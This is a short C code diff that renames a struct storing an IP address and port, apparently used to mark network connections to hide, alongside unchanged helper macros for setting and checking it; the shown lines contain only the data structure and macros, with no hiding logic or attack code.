@@ -1,7 +1,8 @@
 typedef struct {
 	DWORD ip_address;
 	WORD  port;
-} connection_hide_struct;
+} CONNECTION_HIDE;
+
 #define NULL_CONNETCION_HIDE_STRUCT {0,0}
 #define IS_SET_CONNETCION_HIDE_STRUCT(x) (x.ip_address ? TRUE : FALSE)
 #define SET_CONNETCION_HIDE_STRUCT(x,y,z) { x.ip_address=y; x.port=z; }
